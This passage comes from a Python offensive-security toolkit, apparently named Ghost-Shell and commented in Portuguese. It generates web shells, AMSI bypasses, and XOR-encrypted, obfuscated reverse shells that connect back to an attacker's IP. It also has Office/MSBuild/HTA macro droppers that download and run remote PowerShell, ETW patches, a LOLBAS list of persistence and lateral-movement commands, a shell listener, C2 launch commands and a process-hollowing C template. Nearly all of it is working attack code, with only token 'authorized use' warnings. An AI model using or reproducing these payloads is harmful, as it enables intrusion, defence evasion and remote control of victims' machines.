        "template": """<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] commands = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(commands);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) { out.println(line); }
    out.println("</pre>");
}
%>""",
        "uso": "?cmd=id",
    },
    "nodejs": {
        "extensao": ".js",
        "descricao": "Node.js Express middleware web shell",
        "template": """const express = require('express');
const { execSync } = require('child_process');
const app = express();
app.get('/shell', (req, res) => {
    const cmd = req.query.cmd || 'id';
    try { res.send('<pre>' + execSync(cmd).toString() + '</pre>'); }
    catch(e) { res.send(e.message); }
});
app.listen(3000);""",
        "uso": "/shell?cmd=id",
    },
}


def gerar_webshell(tipo, senha=None):
    """Gera um web shell do tipo especificado."""
    if tipo not in WEB_SHELLS:
        _log(f"Tipo desconhecido: {tipo}. Use: {', '.join(WEB_SHELLS.keys())}", "ERRO")
        return

    shell = WEB_SHELLS[tipo]
    template = shell["template"]

    if senha and "{md5}" in template:
        import hashlib
        md5_senha = hashlib.md5(senha.encode()).hexdigest()
        template = template.format(md5=md5_senha)
        _log(f"Senha: {senha} | MD5: {md5_senha}", "INFO")

    print(f"\n{C['C']}{C['N']}  [{tipo}] {shell['descricao']}{C['X']}")
    print(f"  {C['Y']}Extensao: {shell['extensao']} | Uso: {shell['uso']}{C['X']}")
    print(f"\n{C['G']}{template}{C['X']}\n")

    return template


# ==============================================================================
# AMSI BYPASS PAYLOADS
# ==============================================================================

_AMSI_BYPASS_REFLECTION = r"""# AMSI Bypass via Reflection (PowerShell)
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b.GetFields('NonPublic,Static')
        Foreach($d in $c) {
            if ($d.Name -like "*Context") {
                $d.SetValue($null, [IntPtr]$([System.Runtime.InteropServices.Marshal]::AllocHGlobal(0)))
            }
        }
    }
}"""

_AMSI_BYPASS_PATCHBYTE = r"""# AMSI Bypass via PatchByte (PowerShell) - amsiOpenSession = 0xB8,0x57,0x00,0x07,0x80
$b=[System.Text.Encoding]::Unicode.GetBytes('amsiOpenSession');
$a=[System.AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache -eq $true}
|?{$_.FullName.Split(',')[0].Equals('System.Management.Automation')}
$e=$a.GetType('System.Management.Automation.AmsiUtils')
$f=$e.GetField('amsiOpenSession','NonPublic,Static')
$g=$f.GetValue($null)
$h=[System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($g)
[System.Runtime.InteropServices.Marshal]::WriteByte($h,0xB8)
[System.Runtime.InteropServices.Marshal]::WriteInt32($h,1,0x80070057)
[System.Runtime.InteropServices.Marshal]::WriteByte($h,5,0xC3)"""

_AMSI_BYPASS_CONSTRAINED = r"""# AMSI Bypass para Constrained Language Mode (via Add-Type)
$code='using System;using System.Runtime.InteropServices;
public class AMSI{[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);
[DllImport("kernel32")]static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
public static void Patch(){IntPtr l=LoadLibrary("amsi.dll");IntPtr a=GetProcAddress(l,"AmsiScanBuffer");
uint o;VirtualProtect(a,(UIntPtr)5,0x40,out o);Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},0,a,6);}}'
Add-Type $code;[AMSI]::Patch()"""

AMSI_BYPASSES = {
    "reflection":   {"desc": "AMSI Bypass via Reflection API", "code": _AMSI_BYPASS_REFLECTION},
    "patchbyte":    {"desc": "AMSI Bypass via PatchByte direto", "code": _AMSI_BYPASS_PATCHBYTE},
    "constrained":  {"desc": "AMSI Bypass via Add-Type (Constrained LM)", "code": _AMSI_BYPASS_CONSTRAINED},
}


def gerar_amsi_bypass(tipo="reflection"):
    if tipo not in AMSI_BYPASSES:
        _log(f"Tipo invalido. Opcoes: {', '.join(AMSI_BYPASSES.keys())}", "ERRO")
        return
    b = AMSI_BYPASSES[tipo]
    print(f"\n{C['C']}{C['N']}  [AMSI Bypass: {tipo}] {b['desc']}{C['X']}\n")
    print(f"{C['G']}{b['code']}{C['X']}\n")
    _log("Cole ANTES do payload PowerShell. Cada tecnica pode ser detectada — teste no alvo.", "ALERTA")
    return b["code"]


# ==============================================================================
# XOR SHELL GENERATOR
# ==============================================================================

import os as _os


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def gerar_xor_shell(ip, porta, chave=None, linguagem="python3"):
    """Gera payload XOR-cifrado para evasao de AV."""
    payloads_suportados = {
        "python3": (
            f'import socket,subprocess,os\n'
            f's=socket.socket()\ns.connect(("{ip}",{porta}))\n'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n'
            f'subprocess.call(["/bin/bash","-i"])'
        ),
        "powershell": (
            f'$c=New-Object System.Net.Sockets.TCPClient("{ip}",{porta});'
            f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
            f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding)'
            f'.GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$e=[text.encoding]::ASCII.GetBytes($r);'
            f'$s.Write($e,0,$e.Length)}};$c.Close()'
        ),
    }
    if linguagem not in payloads_suportados:
        _log(f"Linguagem nao suportada para XOR. Opcoes: {', '.join(payloads_suportados.keys())}", "ERRO")
        return

    chave_bytes = chave.encode() if chave else _os.urandom(8)
    chave_hex   = chave_bytes.hex()
    payload_raw = payloads_suportados[linguagem].encode()
    payload_enc = xor_encrypt(payload_raw, chave_bytes)
    payload_hex = payload_enc.hex()

    print(f"\n{C['C']}{C['N']}  [XOR Shell: {linguagem}]{C['X']}")
    print(f"  {C['Y']}Chave XOR: {chave_hex}{C['X']}")

    if linguagem == "python3":
        decoder = (
            f"import codecs\n"
            f"_k=bytes.fromhex('{chave_hex}')\n"
            f"_d=bytes.fromhex('{payload_hex}')\n"
            f"_p=bytes(b^_k[i%len(_k)]for i,b in enumerate(_d))\n"
            f"exec(_p.decode())"
        )
        print(f"\n{C['G']}{decoder}{C['X']}\n")
    elif linguagem == "powershell":
        decoder = (
            f'$k=[System.Convert]::FromHexString("{chave_hex}")\n'
            f'$d=[System.Convert]::FromHexString("{payload_hex}")\n'
            f'$p=New-Object byte[] $d.Length\n'
            f'for($i=0;$i -lt $d.Length;$i++){{$p[$i]=$d[$i] -bxor $k[$i%$k.Length]}}\n'
            f'iex([System.Text.Encoding]::ASCII.GetString($p))'
        )
        print(f"\n{C['G']}{decoder}{C['X']}\n")

    _log(f"Chave: {chave_hex} | Payload cifrado: {len(payload_enc)} bytes", "OK")
    return {"chave": chave_hex, "payload_hex": payload_hex, "linguagem": linguagem}


# ==============================================================================
# PAYLOAD OBFUSCATION
# ==============================================================================

import re as _re
import random as _random
import string as _string


def _rand_var(n=6):
    return _random.choice(_string.ascii_lowercase) + "".join(
        _random.choices(_string.ascii_lowercase + _string.digits, k=n-1))


def ofuscar_payload(payload, tecnica="varnames"):
    """Ofusca um payload bash/python/powershell."""
    tecnicas = ["varnames", "concat", "split"]
    if tecnica not in tecnicas:
        _log(f"Tecnica invalida. Opcoes: {', '.join(tecnicas)}", "ERRO")
        return payload

    if tecnica == "varnames":
        # Substituir nomes comuns por vars aleatorias
        subs = [
            ("bash", _rand_var()), ("python3", _rand_var()),
            ("socket", _rand_var()), ("subprocess", _rand_var()),
            ("system", _rand_var()), ("shell", _rand_var()),
        ]
        result = payload
        for orig, rep in subs:
            result = result.replace(orig, rep)
        print(f"\n{C['C']}  [Ofuscado - varnames]{C['X']}\n{C['G']}{result}{C['X']}\n")
        return result

    elif tecnica == "concat":
        # Partir string principal em pedacos concatenados
        if len(payload) < 10:
            return payload
        meio = len(payload) // 2
        p1, p2 = payload[:meio], payload[meio:]
        result = f'eval("{p1}"+"\\n"+"{p2}")'
        print(f"\n{C['C']}  [Ofuscado - concat]{C['X']}\n{C['G']}{result}{C['X']}\n")
        return result

    elif tecnica == "split":
        # Converter cada char num ordinal (para scripts curtos)
        ords = ",".join(str(ord(c)) for c in payload)
        result = f"exec(''.join(chr(x)for x in[{ords}]))"
        print(f"\n{C['C']}  [Ofuscado - split (chr)]{C['X']}\n{C['G']}{result}{C['X']}\n")
        return result


# ==============================================================================
# C2 HINTS
# ==============================================================================

def mostrar_c2_hints(ip, porta):
    """Exibe comandos de inicializacao de C2 frameworks."""
    print(f"\n{C['C']}{C['N']}  [C2 Framework Hints]{C['X']}")
    print(f"\n  {C['Y']}=== Metasploit ==={C['X']}")
    print(f"  msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
          f"set LHOST {ip}; set LPORT {porta}; run'")
    print(f"\n  {C['Y']}=== Sliver ==={C['X']}")
    print(f"  sliver-server")
    print(f"  [sliver]> generate --mtls {ip} --save /tmp/implant.exe")
    print(f"  [sliver]> mtls --lport {porta}")
    print(f"\n  {C['Y']}=== Havoc ==={C['X']}")
    print(f"  # Edite listeners.json: host={ip}, port={porta}, protocol=https")
    print(f"  ./havoc server --profile ./profiles/havoc.yaotl")
    print(f"\n  {C['Y']}=== CobaltStrike ==={C['X']}")
    print(f"  ./teamserver {ip} <senha> /opt/malleable.profile")
    print(f"\n  {C['Y']}=== Ligolo-ng (Pivoting) ==={C['X']}")
    print(f"  # Proxy:  ./proxy -selfcert -laddr 0.0.0.0:{porta}")
    print(f"  # Agent:  ./agent -connect {ip}:{porta} -ignore-cert")
    print()


# ==============================================================================
# MULTI-CONNECTION LISTENER (Python puro)
# ==============================================================================

import threading as _threading
import socket as _socket


def _handle_conexao(conn, addr, idx):
    print(f"\n{C['G']}  [{idx}] Conexao de {addr[0]}:{addr[1]}{C['X']}")
    try:
        while True:
            try:
                cmd = input(f"{C['C']}  [{idx}] shell> {C['X']}")
            except EOFError:
                break
            if cmd.lower() in ("exit", "quit", "bye"):
                break
            conn.sendall((cmd + "\n").encode())
            try:
                conn.settimeout(3.0)
                resp = b""
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except Exception:
                pass
            if resp:
                print(resp.decode(errors="replace"), end="")
    except Exception as e:
        _log(f"Conexao {addr}: {e}", "ERRO")
    finally:
        conn.close()
        print(f"\n{C['Y']}  [{idx}] Conexao encerrada: {addr}{C['X']}")


def iniciar_listener_multi(ip, porta, max_conexoes=5):
    """Listener Python multi-conexao com suporte a shells simultaneas."""
    srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
    try:
        srv.bind((ip, int(porta)))
        srv.listen(max_conexoes)
        _log(f"Listener iniciado em {ip}:{porta} (max {max_conexoes} conexoes)", "OK")
        _log("Ctrl+C para encerrar", "INFO")
        idx = 0
        while True:
            conn, addr = srv.accept()
            idx += 1
            t = _threading.Thread(target=_handle_conexao, args=(conn, addr, idx), daemon=True)
            t.start()
    except KeyboardInterrupt:
        _log("Listener encerrado pelo usuario", "INFO")
    except Exception as e:
        _log(f"Erro no listener: {e}", "ERRO")
    finally:
        srv.close()


# ==============================================================================
# LISTENER
# ==============================================================================

def iniciar_listener(ip, porta):
    """Inicia nc -lvnp no sistema (requer netcat instalado)."""
    _log(f"Iniciando listener em {ip}:{porta}", "INFO")
    _log("Pressione Ctrl+C para encerrar", "INFO")
    try:
        subprocess.run(["nc", "-lvnp", str(porta)], check=False)
    except FileNotFoundError:
        try:
            subprocess.run(["ncat", "-lvnp", str(porta)], check=False)
        except FileNotFoundError:
            if sys.platform == "win32":
                _log("netcat nao encontrado. Alternativas Windows:", "ERRO")
                _log(f"  powercat : IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l -p {porta} -v", "INFO")
                _log(f"  ncat     : ncat.exe -lvnp {porta}", "INFO")
            else:
                _log("netcat/ncat nao encontrado. Instale: apt install netcat-traditional", "ERRO")


# ==============================================================================
# MACRO PAYLOADS
# ==============================================================================

MACRO_PAYLOADS = {
    "vba_word": {
        "descricao": "VBA macro para Word (Document_Open) - executa cmd via Shell",
        "extensao": ".bas",
        "template": """\
' Ghost-Shell VBA Macro - Word/Excel payload
' Insert via VBA Editor (Alt+F11) -> Module -> Paste
Sub Document_Open()
    GhostExec
End Sub

Sub Workbook_Open()
    GhostExec
End Sub

Sub GhostExec()
    Dim cmd As String
    cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {B64}"
    Shell "cmd /c " & cmd, vbHide
End Sub
""",
    },
    "msbuild": {
        "descricao": "MSBuild XML task - inline C# that executes a command",
        "extensao": ".xml",
        "template": """\
<!-- Ghost-Shell MSBuild Payload -->
<!-- Run: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="GhostTarget">
    <GhostTask />
  </Target>
  <UsingTask TaskName="GhostTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class GhostTask : Task, ITask {{
            public override bool Execute() {{
                Process.Start(new ProcessStartInfo {{
                    FileName = "powershell",
                    Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Enc {B64}",
                    UseShellExecute = false, CreateNoWindow = true
                }});
                return true;
            }}
        }}
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
""",
    },
    "hta": {
        "descricao": "HTA/JScript payload - abre via mshta.exe ou duplo clique",
        "extensao": ".hta",
        "template": """\
<html>
<head><title>Ghost-Shell HTA</title></head>
<script language="JScript">
// Ghost-Shell HTA payload
// Execute: mshta payload.hta
var cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {B64}";
var ws = new ActiveXObject("WScript.Shell");
ws.Run("cmd /c " + cmd, 0, false);
window.close();
</script>
<body></body>
</html>
""",
    },
    "vba_raw": {
        "descricao": "VBA puro sem encoding - payload cmd direto (mais simples)",
        "extensao": ".bas",
        "template": """\
' Ghost-Shell VBA Raw - comando direto
Sub Document_Open()
    Dim ws As Object
    Set ws = CreateObject("WScript.Shell")
    ws.Run "cmd /c {CMD}", 0, False
End Sub
""",
    },
}


def gerar_macro(tipo, ip, porta, linguagem="powershell", raw_cmd=None):
    """Gera payload de macro do tipo especificado com reverse shell embutido."""
    if tipo not in MACRO_PAYLOADS:
        _log(f"Tipo desconhecido: {tipo}. Opcoes: {', '.join(MACRO_PAYLOADS.keys())}", "ERRO")
        return

    info = MACRO_PAYLOADS[tipo]
    _log(f"Gerando macro: {tipo} ({info['descricao']})", "TITULO")

    if tipo == "vba_raw":
        cmd = raw_cmd or f"powershell -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{porta}/shell.ps1')"
        template = info["template"].replace("{CMD}", cmd)
    else:
        # Gera payload base64 para powershell reverse shell
        ps_payload = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{porta});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        import base64 as _b64
        b64 = _b64.b64encode(ps_payload.encode("utf-16-le")).decode()
        template = info["template"].replace("{B64}", b64)

    print(f"\n{C['G']}{template}{C['X']}")
    _log(f"Tipo: {tipo} | Listener: {ip}:{porta}", "OK")
    _log(f"Extensao esperada: {info['extensao']}", "INFO")

    if tipo == "msbuild":
        _log("Executar: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe payload.xml", "INFO")
    elif tipo == "hta":
        _log("Executar: mshta.exe payload.hta  OU  mshta.exe http://IP/payload.hta", "INFO")
    elif tipo in ("vba_word", "vba_raw"):
        _log("Inserir via VBA Editor (Alt+F11) no Word/Excel -> Modulo -> Colar", "INFO")


# ==============================================================================
# Shellcode Encoder
# ==============================================================================
# ETW PATCH
# ==============================================================================

def gerar_etw_patch(linguagem="powershell"):
    """Gera codigo para desabilitar Event Tracing for Windows (ETW) para evasao."""
    patches = {
        "powershell": {
            "desc": "Patch ETW via reflection em PowerShell (desabilita EtwEventWrite)",
            "code": r"""# ETW Patch - PowerShell
$EtwEventWrite = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() | Join-Path -ChildPath "clr.dll" | Get-Item
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class EtwPatch {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
}
"@
$ntdll = [EtwPatch]::LoadLibrary("ntdll.dll")
$addr = [EtwPatch]::GetProcAddress($ntdll, "EtwEventWrite")
$dummy = 0
[EtwPatch]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$dummy) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)  # RET
Write-Host "[+] ETW desabilitado"
""",
        },
        "csharp": {
            "desc": "Patch ETW em C# via PInvoke (EtwEventWrite -> RET)",
            "code": r"""// ETW Patch - C#
using System;
using System.Runtime.InteropServices;

class EtwPatch {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] static extern IntPtr LoadLibraryA(string l);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint fl, out uint old);

    static void PatchEtw() {
        IntPtr ntdll = LoadLibraryA("ntdll.dll");
        IntPtr addr  = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProt;
        VirtualProtect(addr, 1, 0x40, out oldProt);
        Marshal.WriteByte(addr, 0xC3); // RET
        VirtualProtect(addr, 1, oldProt, out oldProt);
        Console.WriteLine("[+] ETW patched");
    }
}
""",
        },
        "cpp": {
            "desc": "Patch ETW em C++ inline (EtwEventWrite -> NOP / RET)",
            "code": r"""// ETW Patch - C++
#include <windows.h>
#include <stdio.h>

void PatchEtw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC addr  = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD oldProt;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProt);
    *(BYTE*)addr = 0xC3; // RET
    VirtualProtect(addr, 1, oldProt, &oldProt);
    printf("[+] ETW patched\n");
}
""",
        },
    }

    if linguagem not in patches:
        _log(f"Linguagem invalida. Opcoes: {', '.join(patches)}", "ERRO")
        return

    p = patches[linguagem]
    _secao(f"ETW PATCH ({linguagem.upper()})")
    _log(p["desc"], "INFO")
    print(f"\n{C['G']}{p['code']}{C['X']}\n")
    _log("Este patch modifica memoria em runtime - use somente em ambientes autorizados.", "ALERTA")
    return p["code"]


# ==============================================================================
# LOLBAS (Living Off the Land Binaries and Scripts)
# ==============================================================================

LOLBAS_DB = {
    "download": [
        ("certutil",   "certutil.exe -urlcache -split -f http://IP/file.exe C:\\Windows\\Temp\\file.exe",
         "Download via certutil (bloqueado em alguns EDRs)"),
        ("bitsadmin",  "bitsadmin /transfer job /download /priority high http://IP/file.exe C:\\Temp\\file.exe",
         "Download via BITS (backgroundintelligent transfer)"),
        ("powershell", "(New-Object Net.WebClient).DownloadFile('http://IP/file.exe','C:\\Temp\\f.exe')",
         "Download via PowerShell WebClient"),
        ("curl",       "curl http://IP/file.exe -o C:\\Temp\\file.exe",
         "Download via curl (Windows 10+)"),
        ("wget",       "Invoke-WebRequest -Uri http://IP/file.exe -OutFile C:\\Temp\\file.exe",
         "Download via Invoke-WebRequest (alias wget no PS)"),
        ("mshta",      "mshta http://IP/payload.hta",
         "Executa HTA remotamente via mshta"),
        ("regsvr32",   "regsvr32 /s /n /u /i:http://IP/payload.sct scrobj.dll",
         "Executa COM scriptlet remoto (squiblydoo)"),
        ("wmic",       "wmic process call create \"cmd /c certutil -urlcache -f http://IP/x.exe x.exe && x.exe\"",
         "Executa comando via WMI"),
    ],
    "exec": [
        ("rundll32",   "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";eval(...)",
         "Executa JS via rundll32 (LOLBAS classico)"),
        ("msbuild",    "msbuild.exe C:\\Temp\\build.xml",
         "Executa codigo C# inline via MSBuild (bypass AppLocker)"),
        ("installutil","C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe",
         "Executa payload via InstallUtil (bypass AppLocker)"),
        ("regasm",     "regasm.exe payload.dll",
         "Executa DLL .NET via regasm (bypass AppLocker)"),
        ("csc",        "csc.exe /out:C:\\Temp\\x.exe C:\\Temp\\x.cs && C:\\Temp\\x.exe",
         "Compila e executa C# inline"),
        ("wscript",    "wscript //e:jscript payload.txt",
         "Executa JScript via wscript com extensao falsa"),
        ("cmstp",      "cmstp.exe /s /ns C:\\Temp\\cmstp.inf",
         "Executa payload via CMSTP (bypass UAC + AppLocker)"),
        ("forfiles",   "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c payload.exe\"",
         "Executa via forfiles"),
    ],
    "persist": [
        ("schtasks",   "schtasks /create /tn GhostTask /tr C:\\Temp\\payload.exe /sc onlogon /ru System",
         "Persistencia via schtask rodando como SYSTEM"),
        ("reg",        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Ghost /t REG_SZ /d C:\\Temp\\payload.exe",
         "Persistencia via Run key no registro"),
        ("wmic_persist","wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE...",
         "Persistencia via WMI event subscription"),
        ("sc",         "sc create GhostSvc binPath= C:\\Temp\\payload.exe start= auto && sc start GhostSvc",
         "Persistencia via servico Windows"),
    ],
    "recon": [
        ("nltest",     "nltest /domain_trusts && nltest /dclist:DOMAIN",
         "Enumera dominios e DCs confiados"),
        ("net",        "net user /domain && net group \"Domain Admins\" /domain",
         "Enumera usuarios e grupos AD"),
        ("whoami",     "whoami /all && whoami /groups",
         "Privilegios e grupos do usuario atual"),
        ("quser",      "quser && query session",
         "Lista sessoes de usuario ativas (RDP, console)"),
        ("arp",        "arp -a && ipconfig /all",
         "Tabela ARP e interfaces de rede"),
        ("netstat",    "netstat -anob",
         "Conexoes abertas com PIDs"),
        ("tasklist",   "tasklist /v /fo csv",
         "Processos em execucao"),
        ("reg_creds",  "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\WDigest /v UseLogonCredential",
         "Verifica se WDigest esta habilitado (credenciais em memoria)"),
    ],
    "lateral": [
        ("wmiexec",    "wmic /node:TARGET /user:DOMAIN\\USER process call create \"cmd /c whoami > C:\\out.txt\"",
         "Execucao remota via WMI"),
        ("psexec_lol", "copy payload.exe \\\\TARGET\\C$\\Windows\\Temp\\ && sc \\\\TARGET create svc binPath= ...",
         "Movimento lateral manual via SMB + sc"),
        ("winrm",      "Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }",
         "Execucao remota via WinRM (PS Remoting)"),
        ("dcom",       "$com=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'))\n$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c payload.exe','7')",
         "Movimento lateral via DCOM MMC20.Application"),
    ],
    "bypass_av": [
        ("signed_proxy","regsvr32 /s /u /i:PAYLOAD.sct scrobj.dll  # Signed binary proxy exec",
         "Executa payload via binario assinado Microsoft"),
        ("env_var",    "set COMSPEC=C:\\Temp\\payload.exe && cmd /c %COMSPEC%",
         "Substitui COMSPEC para executar payload"),
        ("alternate_ds","type payload.exe > C:\\Windows\\System32\\calc.exe:payload.exe",
         "Armazena payload em Alternate Data Stream (ADS)"),
    ],
}

def mostrar_lolbas(objetivo="exec"):
    """Lista binarios nativos do Windows para o objetivo dado (download/exec/persist/recon/lateral/bypass_av)."""
    objetivos = list(LOLBAS_DB.keys())
    if objetivo not in LOLBAS_DB:
        _log(f"Objetivo invalido. Opcoes: {', '.join(objetivos)}", "ERRO")
        return

    _secao(f"LOLBAS - {objetivo.upper()}")
    _log(f"Binarios nativos Windows para: {objetivo}", "INFO")
    print()
    for nome, cmd, desc in LOLBAS_DB[objetivo]:
        print(f"  {C['C']}{C['N']}[{nome}]{C['X']} {C['D']}{desc}{C['X']}")
        print(f"  {C['G']}{cmd}{C['X']}\n")

    _log("Fonte: lolbas-project.github.io - Use apenas em ambientes autorizados.", "ALERTA")


# ==============================================================================
# PROCESS HOLLOWING TEMPLATE
# ==============================================================================

def gerar_process_hollow():
    """Gera template C de process hollowing (injecao em processo legitimo)."""
    _secao("PROCESS HOLLOWING TEMPLATE (C)")
    _log("Injeta shellcode em processo alvo (ex: notepad.exe) via hollow", "INFO")

    codigo = r"""/*
 * Process Hollowing - Ghost-Shell Template
 * By Gh0st-Bx1 | github.com/Ghost-Bx1
 *
 * Compile: cl.exe /MT hollow.c Advapi32.lib
 * Or:      gcc hollow.c -o hollow -lntdll
 *
 * Fluxo:
 *   1. Cria processo alvo suspenso (CreateProcess com CREATE_SUSPENDED)
 *   2. Lê base address via NtQueryInformationProcess
 *   3. Unmap do processo alvo (NtUnmapViewOfSection)
 *   4. Aloca memoria no processo alvo (VirtualAllocEx)
 *   5. Escreve shellcode (WriteProcessMemory)
 *   6. Retoma thread (ResumeThread) -> shellcode executa
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// TODO: substitua por seu shellcode (msfvenom / sliver / custom)
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, // NOP sled - substitua aqui
    0xcc              // INT3 - breakpoint (teste)
};
SIZE_T shellcode_len = sizeof(shellcode);

int main() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Criar processo alvo suspenso
    char target[] = "C:\\Windows\\System32\\notepad.exe";
    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess falhou: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Processo criado (suspenso): PID %d\n", pi.dwProcessId);

    // 2. Obter contexto da thread principal
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // 3. Ler PEB para obter ImageBaseAddress
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
        GetProcAddress(ntdll, "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi;
    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    // Lê ImageBaseAddress do PEB
    PVOID imageBase;
    ReadProcessMemory(pi.hProcess,
        (LPCVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x10),
        &imageBase, sizeof(imageBase), NULL);
    printf("[+] ImageBase do alvo: %p\n", imageBase);

    // 4. Unmap da imagem original
    pNtUnmapViewOfSection NtUVS = (pNtUnmapViewOfSection)
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    NtUVS(pi.hProcess, imageBase);
    printf("[+] Imagem original removida\n");

    // 5. Alocar memoria e escrever shellcode
    LPVOID base = VirtualAllocEx(pi.hProcess, imageBase,
        shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) {
        printf("[-] VirtualAllocEx falhou: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    WriteProcessMemory(pi.hProcess, base, shellcode, shellcode_len, NULL);
    printf("[+] Shellcode escrito em: %p\n", base);

    // 6. Atualizar RIP/EIP para o shellcode e retomar
#ifdef _WIN64
    ctx.Rip = (DWORD64)base;
#else
    ctx.Eip = (DWORD)base;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    printf("[+] Thread retomada - shellcode em execucao\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
"""
    print(f"{C['G']}{codigo}{C['X']}")
    fname = "hollow.c"
    with open(fname, "w") as f:
        f.write(codigo)
    _log(f"Template salvo: {fname}", "OK")
    _log("Compile: cl.exe /MT hollow.c  ou  gcc hollow.c -o hollow -lntdll", "INFO")
    return codigo


# ==============================================================================

def gerar_shellcode_encoder(shellcode_hex: str, arch: str = "auto", chave: int = None):
    """XOR-encode raw shellcode (hex string) e gera stubs em C, Python3 e C#."""
    _secao("SHELLCODE ENCODER (XOR)")

    # Normaliza hex
    shellcode_hex = shellcode_hex.replace("\\x", "").replace("0x", "").replace(" ", "").replace(",", "")
    try:
        raw_bytes = bytes.fromhex(shellcode_hex)
    except ValueError:
